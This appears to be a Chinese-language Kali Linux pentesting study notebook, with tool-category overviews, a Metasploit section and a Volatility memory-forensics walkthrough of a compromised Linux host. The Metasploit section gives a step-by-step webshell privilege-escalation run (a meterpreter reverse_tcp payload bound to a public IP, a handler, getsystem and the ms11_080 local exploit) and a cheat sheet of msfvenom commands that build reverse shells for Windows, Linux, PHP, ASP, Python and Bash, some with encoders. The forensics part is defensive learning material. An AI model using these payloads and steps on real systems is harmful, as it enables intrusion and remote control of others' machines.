一、简介
1.系统安装
2.配置
3.常用工具安装
4.工具集说明
#01信息搜集工具集
分为DNS分析、IDS/IPS识别、SMB分析、SMTP分析、SNMP分析、SSL分析、VoIP分析、VPN分析、存活主机识别、电话分析、服务指纹识别、流浪分析、路由分析、情报分析、系统指纹识别共15个小分类：
{
DNS分析包含dnsdict6、dnsenum等12个工具
IDS/IPS识别包含fragrout、fragrouter、ftest、lbd、wafwOOf四个工具
/*扩展---IDS/IPS
IDS(intrusion detection system),即入侵检测系统。是一种对网络传输进行即时监视，在发现可疑传输时发出警报或者采取主动反应措施的网络安全设备。它与其他网络安全设备的不同之处便在于，IDS是一种积极主动的安全防护技术。
IPS（Intrusion Prevention System）即入侵防御系统。IPS位于防火墙和网络的设备之间。这样，如果检测到攻击，IPS会在这种攻击扩散到网络的其它地方之前阻止这个恶意的通信。

二者的区别：
入侵检测系统注重的是网络安全状况的监管。入侵防御系统关注的是对入侵行为的控制。
入侵检测系统需要部署在网络内部的中心点，需要能够观察到所有网络数据。入侵防御系统需要部署在网络的边界。
入侵检测系统的核心价值在于通过对全网信息的分析，了解信息系统的安全状况，进而指导信息系统安全建设目标以及安全策略的确立和调整，而入侵防御系统的核心价值在于安全策略的实施—对黑客行为的阻击;入侵检测系统需要部署在网络内部，监控范围可以覆盖整个子网，包括来自外部的数据以及内部终端之间传输的数据，入侵防御系统则必须部署在网络边界，抵御来自外部的入侵，对内部攻击行为无能为力。

参考：http://security.zdnet.com.cn/security_zone/2009/0412/1362627.shtml
*/
smb分析包含acccheck、nmap、zenmap、nbtscan等四个工具
/*
扩展---smb协议
SMB是Server Message Block的简写
这个协议用于共享文件，共享打印机，共享串口等用途。
我们之所以能够在windows的网络邻居下访问一个域内的其他机器，就是通过这个协议实现的。
SMB 协议是一个很重要的协议，目前绝大多数的PC上都在运行这一协议，windows系统都充当着SMB协议的客户端和服务器，所以SMB是一个遵循客户机服/务器模式的协议。
SMB服务器负责通过网络提供可用的共享资源给SMB客户机，服务器和客户机之间通过TCP/IP协议、或者IPX协议、或者是 NetBEUI进行连接。

参考：http://msdn.microsoft.com/en-us/library/cc246231.aspx
*/
SMTP
SNMP
SSL分析
VoIP
/*
扩展—VoIP简介

VoIP是 Voice over Internet Protocol的缩写
指的是将模拟的声音讯号经过压缩与封包之后，以数据封包的形式在IP 网络的环境进行语音讯号的传输
通俗来说也就是互联网电话、网络电话或者简称IP电话的意思。

参考资料：https://www.cisco.com/application/pdf/en/us/guest/tech/tk587/c1506/ccmigration_09186a008012dd36.pdf*/
}
#02

二、常用命令

三、信息收集

四、漏洞扫描
1.nmap使用



五、漏洞利用
（一）MSF
1.安装配置
metasploit一款开源的安全漏洞检测工具，漏洞利用平台
	官网：https://www.metasploit.com/
	下载：https://www.rapid7.com/products/metasploit/download.jsp
Kali安装vmware tools：
	http://jingyan.baidu.com/article/624e745952508c34e8ba5aca.html
	http://jingyan.baidu.com/article/e75057f2de5792ebc81a894c.html

2.常见命令

3.提权思路
Webshell提权步骤
第一步：生成反弹脚本或执行文件
	msfvenom -p windows/meterpreter/reverse_tcp LHOST=49.210.187.182 LPORT=4444 -f exe -o /root/door.exe
生成执行文件door.exe 绑定地址：49.210.187.182:4444
由于路由器设置了端口转发，将4444端口转发至192.168.1.111

第二步：加载msf，监听反弹结果
	use exploit/multi/handler 设置接受反弹模块
	set payload windows/meterpreter/reverse_tcp 设置反弹结果处理载荷
	show options 查看配置选项
	Show targets 查看攻击目标
	set LHOST 192.168.1.111 设置本地监听地址192.168.1.111
	exploit 执行
 
第三步：接受反弹，进行提权操作
	meterpreter > getuid （获取当前权限）
		Server username: NT AUTHORITY\NETWORK SERVICE
	meterpreter > getsystem （尝试提权操作）
		[-] priv_elevate_getsystem: Operation failed: Access is denied. The following was attempted:
		[-] Named Pipe Impersonation (In Memory/Admin)
		[-] Named Pipe Impersonation (Dropper/Admin)
		[-] Token Duplication (In Memory/Admin)
	meterpreter > background （返回 选择提权exp）
		[*] Backgrounding session 1...
	msf exploit(handler) > use exploit/windows/local/ms11_080_afdjoinleaf  (选择提权exp)
	msf exploit(ms11_080_afdjoinleaf) > set session 1 （载入当前反弹shell）
		session => 1
	msf exploit(ms11_080_afdjoinleaf) > exploit （执行）

4.生成反弹脚本
MSF Payloads
	msfvenom -p windows/meterpreter/reverse_tcp LHOST=<IP Address> X > system.exe
	ms fvenom -p php/meterpreter/reverse_tcp LHOST=<IP Address> LPORT=443 R > exploit.php
	msfvenom -p windows/meterpreter/reverse_tcp LHOST=<IP Address> LPORT=443 -e -a x86 --platform win -f asp -o file.asp
	msfvenom -p windows/meterpreter/reverse_tcp LHOST=<IP Address> LPORT=443 -e x86/shikata_ga_nai -b "\x00" -a x86 --platform win -f c

MSF 生成在 Linux 下反弹的 Meterpreter Shell
	msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=<IP Address> LPORT=443 -e -f elf -a x86 --platform linux -o shell
MSF 生成反弹 Shell (C Shellcode)
	msfvenom -p windows/shell_reverse_tcp LHOST=127.0.0.1 LPORT=443 -b "\x00\x0a\x0d" -a x86 --platform win -f c
MSF 生成反弹 Python Shell
	msfvenom -p cmd/unix/reverse_python LHOST=127.0.0.1 LPORT=443 -o shell.py
MSF 生成反弹 ASP Shell
	msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.111 LPORT=4444 -f asp -a x86 --platform win -o shell.asp
	root@kali:~# msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.111 LPORT=4444 -f asp -a x86 --platform windows -o /root/shell.asp
MSF 生成反弹 Bash Shell
	msfvenom -p cmd/unix/reverse_bash LHOST=<Your IP Address> LPORT=<Your Port to Connect On> -o shell.sh
MSF 生成反弹 PHP Shell
	msfvenom -p php/meterpreter/reverse_tcp LHOST=<Your IP Address> LPORT=<Your Port to Connect On> -o shell.php
	add <?php at the beginning
	perl -i~ -0777pe's/^/<?php \n/' shell.php
MSF 生成反弹 Win Shell
	msfvenom -p windows/meterpreter/reverse_tcp LHOST=<Your IP Address> LPORT=<Your Port to Connect On> -f exe -a x86 --platform win -o shell.exe

5.常见问题
1)网络问题（内网问题）
	拨号上网=>代理上网
	路由器上网=>设置路由器端口转发
	设置端口4444的流量转发至192.168.1.111上
 
2)反弹问题
	脚本不支持socket
	防护软件
	采用cdn加速
	
3)其他


六、权限提升

七、密码攻击

八、wifi破解

九、数字取证
1.binwalk


2.Volatility
#01简介
{
Volatility是开源的Windows，Linux，MaC，Android的内存取证分析工具，由python编写成，命令行操作，支持各种操作系统。
项目地址：
	https://code.google.com/p/volatility/
只介绍简单的使用，详细使用方法可以看CheatSheet。在官方网站包含Linux的相关命令参考：
	https://code.google.com/p/volatility/wiki/LinuxCommandReference23#linux_pidhashtable
含以下内容
	Processes
	linux_pslist
	linux_psaux
	linux_pstree
	linux_pslist_cache
	linux_pidhashtable
	linux_psxview
	linux_lsof
	Process Memory
	linux_memmap
	linux_proc_maps
	linux_dump_map
	linux_bash
	Kernel Memory and Objects
	linux_lsmod
	linux_moddump
	linux_tmpfs
	Rootkit Detection
	linux_check_afinfo
	linux_check_tty
	linux_keyboard_notifier
	linux_check_creds
	linux_check_fop
	linux_check_idt
	linux_check_syscall
	linux_check_modules
	linux_check_creds
	Networking
	linux_arp
	linux_ifconfig
	linux_route_cache
	linux_netstat
	linux_pkt_queues
	linux_sk_buff_cache
	System Information
	linux_cpuinfo
	linux_dmesg
	linux_iomem
	linux_slabinfo
	linux_mount
	linux_mount_cache
	linux_dentry_cache
	linux_find_file
	linux_vma_cache
	Miscellaneous
	linux_volshell
	linux_yarascan

#02安装
源代码安装方法：
	apt-get install subversion-tools
	svn checkout http://volatility.googlecode.com/svn/trunk/ /usr/local/src/volatility/
参考：
	https://code.google.com/p/volatility/wiki/VolatilityInstallation
Back Track和Kali Linux中自带此程序。以Kali-Linux为例，volatility在“应用程序”-“Kali Linux”-“数字取证”-“内存取证工具集”中。

#03基本使用命令
	./vol.py ‐f [image] -‐profile=[profile] [plugin]
应该是一个Bug，-f后面需要跟绝对路径（Kali）。

    查看扫描检查、插件、地址空间等信息

    ./vol.py --info

    查看帮助信息

    ./vol.py -h/--help

    查看指定插件的说明

    ./vol.py [plugin] --help

    从扩展目录加载插件

    ./vol.py --plugins=[path][plugin]

    检查结果输出

    ./vol.py --output-file=[file]

#04制作Linux系统的Profile
Volatility自带一些windows系统的profile，Linux系统的Profile需要自己制作，制作的方法如下：
（实际是将module.dwarf和system.map打包成一个zip文件，接着将zip文件移动到 volatility/plugins/overlays/linux/ 中。）
Linux的Profile文件是一个zip的压缩包。
准备

https://code.google.com/p/volatility/wiki/LinuxMemoryForensics

$ sudo zip volatility/volatility/plugins/overlays/linux/Ubuntu1204.zip volatility/tools/linux/module.dwarf /boot/System.map-3.2.0-23-generic

实际也可以在https://github.com/KDPryor/LinuxVolProfiles处直接下载已经做好的profile。
在kali下位置放在/usr/share/volatility/volatility/plugins/overlays/

如果知道dump的内存是那种操作系统和操作系统版本的，可以直接制定profile;如果不知道是那种系统的内存，可以使用imageinfo选项，volatility会尝试自动判断内存的类型

vol -f /root/Downloads/pexit.vmem imageinfo

#05获取内存镜像
可以参考

http://www.forensicswiki.org/wiki/Tools%3aMemory_Imaging#Linux
Dd
$ sudo dd if=/dev/mem of=/tmp/mem_dump.dd bs=1MB count=1010+0 records in10+0 records out10000000 bytes (10 MB) copied, 0.0331212 s, 302 MB/s

#06使用示例
检查内存进程

[2013-12-31 21:33:10的屏幕截图.png]

- 了解Linux系统常见系统进程；

- 查看自动任务进程；

- 如果系统没有重启过，但部分进程都是开机启动，查看进程运行时间；

上面有进程号1517、27157、7334创建的时间明显与其他进程的创建时间不同，为可疑进程

检查进程详细信息

vol -f /root/Downloads/pexit.vmem --profile=LinuxUbuntu1004_pae32-33x86 linux_psaux

[2014-01-01 12:24:07的屏幕截图.png]

1517进程，位置在/usr/bin/httpd，另外27157进程的参数是 -B -c，通过查找rsyslogd的帮助文件发现rsyslogd并没有-B的参数。
通过linux_pidhashtable参数可以查找到隐藏的进程

可以看到有4个rsyslogd进程与27157的进程同时建立。
使用linux_netstat查看网络链接情况。

vol -f /root/Downloads/pexit.vmem --profile=LinuxUbuntu1004_pae32-33x86 linux_netstat

[2014-01-01 12:29:19的屏幕截图.png]

异常链接的地址为210.177.175.82
可以通过linux_route_cache参数查看路由表情况。

vol -f /root/Downloads/pexit.vmem --profile=LinuxUbuntu1004_pae32-33x86 linux_route_cache

[2014-01-01 12:42:19的屏幕截图.png]

使用linux_lsof命令查看1517和27157进程相关的文件

vol -f /root/Downloads/pexit.vmem --profile=LinuxUbuntu1004_pae32-33x86 linux_lsof

[2014-01-01 12:44:59的屏幕截图.png]

注意“/tmp/.ICE-unix/-log/”文件
使用linux_proc_maps参数，可以查看进程细节包括共享库、开始和结束的位置等信息

vol -f /root/Downloads/pexit.vmem --profile=LinuxUbuntu1004_pae32-33x86 linux_proc_maps | grep 1517

查看可疑文件的位置

vol -f /root/Downloads/pexit.vmem --profile=LinuxUbuntu1004_pae32-33x86 linux_find_file -F "/tmp/.ICE-unix/-log/httpds"

[2014-01-01 13:01:52的屏幕截图.png]

vol -f /root/Downloads/pexit.vmem --profile=LinuxUbuntu1004_pae32-33x86 linux_find_file -i 0xf5a4e568 -O /root/dump

[2014-01-01 13:13:03的屏幕截图.png]

strings /root/dump

参考：

http://sempersecurus.blogspot.com/2013/12/a-forensic-overview-of-linux-perlbot.html

https://code.google.com/p/volatility/wiki/LinuxCommandReference23#linux_pidhashtable



